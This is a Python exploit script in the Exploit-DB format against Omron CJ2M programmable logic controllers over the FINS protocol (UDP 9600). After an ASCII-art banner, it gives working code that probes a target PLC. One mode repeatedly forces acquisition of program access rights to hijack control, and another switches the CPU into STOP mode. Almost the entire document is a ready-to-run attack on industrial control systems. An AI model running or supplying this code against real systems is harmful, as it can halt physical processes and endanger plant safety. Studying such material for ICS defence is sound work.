#!usr/bin/python

######################################################################################################
#                                                                                                     #
#                                     `-:+oyhdmmNNNNNNNNmdhyso/:.                                     #
#                                -/shmNmhyo+/:-..`````..--:/oshdNNdyo:.                               #
#                           `:ohNmho/-`                          .:+ydNmy+.                           #
#                        .+hNms/.                                     `:ohNms:`                       #
#                     .+dNh+.                                             `/ymNy:                     #
#                   :yNd+.                                                   `/yNmo.                  #
#                `/dNy-`                                                        .+mNy-                #
#               +mmo.                                                             `/dNy-              #
#             :dNo`                      ``........--.......```                     `/dNs.            #
#           .yNy.         .-        ``....```....``..``....```...``        `-`        `+Nm/           #
#          /mm:       ./ymy.     `...``  `..`  ``  .`  `` `..`   `...`      +mho:`      .yMh.         #
#        `sNy.   `.`/hNMNo`    `..`    `.`    .`   .`   ``   `..    `...`    -dMNmo...   `+Nm:        #
#       `yNo`  -yy-sMMMh-    ......```.`     .`    .`    ``    .-...`` `..`   `+NMMm:+h+`  :mN/       #
#      `hN/   +Nm.sMMh/:   `..     `.....```..` `//+yy+.``.``...`..`     `..   ./oNMm-oMh.  -dN+      #
#     `hN+  `/MMo:Nh:/h- `..`      ..     `..```oMy.:NMd```.      ..       `.`  ys:omh.NMh`  .mM/     #
#     yM+ `o-hMN.:+sdm/ `-.       ..       .`   ./-./NNo   .`      ..       `.` .hmy+/`sMM-o- -mN:    #
#    +My .dd`mMy/hNmo. `-`````   `.       `-       :ho.    `.       ..    ````.. `/hNmo/NM//N/ :Mm`   #
#   .mm. sMd`mMmNd+/` `-`    ``..-.```    ..       +.       .`    ``.-...``    ..  :/yNNNM/:MN` sMs   #
#   yM+ `mMm`mMm+-ss `-`        ..```.....-....```-o+.```...-.....```.-`        .` -h/:yMM/+MM/ .mN-  #
#  .Nm` `NMN`yo/yNd. ..         -`       `-```````yNm-```````.       `-`        `.  oNd++h:sMM+  oMy  #
#  +Mo `.NMM.:hNMd. `-`        `.        .-       `:-       `-        ..         .` `oNMmo`yMM+. .NN` #
#  hN- y:hMMoNMmo.  ..         .`        ..        .`        -        `-         `.   /hMMydMM-h. dM/ #
# .mm`-No-NMMMy-o:  ..         .`        ..      .://-` `    -`       `-`         -   y-+mMMMy.Ns sMs #
# :Nd :Mm.oMMo.sN.  ..`````````-`````````..`./s` :smds: :s:``-`````````-.`````````-`  ym--NMm.sMh +Mh #
# +Mh -NMy`hd-hMd`  ..`````````-```````.-/+smMy   -my`  `dNho/.````````-``````````-   /Mm/+N:-NMs /Mh #
# /Nh  hMM/-/hMM/   ..         .` `+yhdmmNMMMM.   .so`   yMMMNmhyso+/.`-`        `-   `mMN/+.dMM- /Mh #
# -Nd` -NMm-+MMh.   `.         .` oMMMMMMMMMMN`   `hy    yMMMMMMMMMMMd.-         `.   `/MMd`yMMy  oMy #
# `mN.`.oNMhyMN-o/   -`        `.`mMMMMMMMMMMM-   -NN.  `dMMMMMMMMMMMM/.         .`  `y`hMNoMMh.- yMo #
#  yM:.h./mMMMs dm`  `.         .+MMMMMMMMMMMMo   /MM/  :NMMMMMMMMMMMMs`        `.   oN--NMMNy.+o`mM- #
#  /My`dd/-yNM:.NM+   ..      ``.hMMMMMMMMMMMMN-  oMMo `hMMMMMMMMMMMMMh.`      `.`  `mMo`dMm/-yN/:Mm` #
#  `mN./MMh-/d/+MMs    .` ``````.NMMMMMMMMMMMMMm- sMMs oMMMMMMMMMMMMMMm.````` `.`   -NMd`ds-omMh`hMo  #
#   +Ms oNMNo--sMMh`-   ..`     oMMMMMMMMMMMMMMMm:yMMhoMMMMMMMMMMMMMMMN-    `..`  `-:MMN.:/dMMd.:Nm.  #
#   `hN: /NMMm/+MMm`h+   ..     mMMMMMMMMMMMMMMMMNNMMMMMMMMMMMMMMMMMMMMo    `.`  -h-oMMd-yMMMy.`dM/   #
#    -Nm. +yNMMdNMN-/Ms`  `.`  -MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh   ..   :mh`hMMdNMNdo- sMy    #
#     /Nh`:y+odNMMMo`mMy    ..`/MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm``.`   :NM/.NMMMmy+os`oMd.    #
#      +Mh`+Nh//odNm`oMM+    `.sMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.`    .mMN`oNmy+/smh`+Mm.     #
#       +Nh./mMNho++-.mMN/-/`  hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM- `-:.dMMo`+++ymMNs.oNd-      #
#        /Nd-.omMMMmy+/dMN//ds-hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM//hy-dMNs:sdMMMNh:`sMh.       #
#         -dN+``/ymNMMNdmMMo/mNdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMs:mMNdmMMNmh+. -dMs`        #
#          `yNy. /o+/oyhmmNNy:hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm//mNNmdys+/+o.`oNm/          #
#            :mNo`:dmdyo////+:./yNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdo--+//:/+shmmo.:dNy.           #
#             `+mm+.:smNMMMMMMMMNNNNmmMMMMMMMMMMMMMMMMMMMMMMMMMMNhmNNNNMMMMMMMMMNh+.:hNh-             #
#               `oNmo.`.+ooooo+//:--:yMMMMMMMMMMMMMMMMMMMMMMMMMMmo/--::/++ooooo:``/hNd:               #
#                 `+mNs:.+yso++oshmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdys+++oys:.odNh:                 #
#                    :yNdo-/sdNNMMMNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMdmNNMMNNmy+:/hNmo.                   #
#                      `+hNds:``...`/MMMMMMMMMMMMMMMMMMMMMMMMMMMM: `....`-ohNms:                      #
#                         `/ymNds/.`sMMMMMMMMMMMMMMMMMMMMMMMMMMMM+  `:ohNNdo-                         #
#                             ./sdNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMdhmNNho:`                            #
#                                 `-/oydNMMMMMMMMMMMMMMMMMMMMMMmhy+:.                                 #
#                                        `.://+osyyyyyyso+/:-.                                        #
#                                                                                                     #
#                                                                                                     #
# Exploit Title: Omron PLC: Denial-of-Service as a Feature                                            #
# Google Dork: n/a                                                                                    #
# Date: 2019.12.06                                                                                    #
# Exploit Author: n0b0dy                                                                              #
# Vendor Homepage: https://automation.omron.com, ia.omron.com                                         #
# Software Link: n/a                                                                                  #
# Version: 1.0.0                                                                                      #
# Tested on: PLC f/w rev.: CJ2M (v2.01)                                                               #
# CWE-412 : Unrestricted Externally Accessible Lock                                                   #
# CVE : n/a                                                                                           #
#                                                                                                     #
#######################################################################################################
import sys, signal, socket, time, binascii

nic = socket.gethostbyname(socket.gethostname()) #will fail if hostname = 'hostname'

if len(sys.argv) < 2:
	print "Usage: fins.dos.py [arg.] {target ip} {target port[9600]}"
	print "--pwn	Hijack control of PLC program."
	print "--stop	Stop PLC CPU."

else:
	ip = sys.argv[2]

	try:
		port = sys.argv[3]
	except:
		port = 9600

	def ip_validate(ip):
		a = ip.split('.')
		if len(a) != 4:
			return False
		for x in a:
			if not x.isdigit():
				return False
			i = int(x)
			if i < 0 or i > 255:
				return False
		return True

	#fins header
	icf = '\x80' #info control field (flags); 80=resp req, 81=resp not req
	rsv = '\x00' #reserved
	gct = '\x02' #gateway count
	dna = '\x00' #dest net addr
	idnn = ip[-1:] #dest node no (last digit of target ip)
	dnn_i = '0' + idnn
	dnn = binascii.a2b_hex(dnn_i)
	dua = '\x00' #dest unit addr
	sna = '\x00' #source net addr
	isnn = nic[-1:] #source node no (last digit of own ip)
	snn_i = '0' + isnn
	snn = binascii.a2b_hex(snn_i)
	sua = '\x00' #source unit addr
	sid = '\x7a' #service ID
	fins_hdr = icf + rsv + gct + dna + dnn + dua + sna + snn + sua + sid

	#FINS command acceptance code
	fins_ok = '\x00'
	#Verify PLC type
	CmdMRst1 = binascii.a2b_hex("05")
	CmdSRst1 = binascii.a2b_hex("01")
	Cmdst1 =\
		fins_hdr + CmdMRst1 + CmdSRst1 + '\x00'
	print "Probing PLC... " + '\t'
	s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s1.sendto(Cmdst1, (ip, port))
	print "Finished." + '\r\n'
	s1fins_resp = s1.recvfrom(1024)
	s1fins_resp_b = bytes(s1fins_resp[0])
	if s1fins_resp_b[12] == fins_ok and s1fins_resp_b[13] == fins_ok:
		print "FINS target is exploitable: "
		print s1fins_resp_b[14:39]
	else:
		print "FINS target not exploitable."
		print "FINS response from target: ", s1fins_resp

	if sys.argv[1] == "--pwn":

		#access right forced acquire
		PgmNo = '\xff'
		CmdMRst2 = binascii.a2b_hex("0c")
		CmdSRst2 = binascii.a2b_hex("02")
		Cmdst2 =\
			fins_hdr + CmdMRst2 + CmdSRst2 + PgmNo + PgmNo
		reqdly = 1
		persist = 1
		pwnage = 0
		print "Obtaining control of PLC program..." + '\r\n'
		while persist == 1:
			try:
				s2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				time.sleep(reqdly)
				s2.sendto(Cmdst2, (ip, port))
				s2fins_resp = s2.recvfrom(1024)
				s2fins_resp_b = bytes(s2fins_resp[0])
				if s2fins_resp_b[12] == fins_ok and s2fins_resp_b[13] == fins_ok:
					pwnage += 1
					pwntime = str(pwnage)
					sys.stdout.write('\r' + "Pwnage in progress! " + "duration: " + pwntime + " sec.")
					sys.stdout.flush()
				else:
					print "Attack unsuccessful. ", '\r\n'
					print "FINS error code: ", s2fins_resp
			except socket.error as e:
				print socket.error
				s2.close()
			except KeyboardInterrupt:
				persist = 0
				print '\r', " Attack interrupted by user."
				s2.close()

	elif sys.argv[1] == "--stop":
		#change OP Mode
		CmdMRst3 = binascii.a2b_hex("04")
		CmdSRst3 = binascii.a2b_hex("02")
		Cmdst3 =\
			fins_hdr + CmdMRst3 + CmdSRst3
		print "Stopping PLC (just for fun)... " + '\t'
		s3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s3.sendto(Cmdst3, (ip, port))
		print "Finished. "
		s3fins_resp = s3.recvfrom(1024)
		s3fins_resp_b = bytes(s3fins_resp[0])
		if s3fins_resp_b[12] == fins_ok and s3fins_resp_b[13] == fins_ok:
			print "PLC CPU STOP mode confirmed. "
		else:
			print "Attack unsuccessful. ", '\r\n'
			print "FINS response from target: ", s3fins_resp

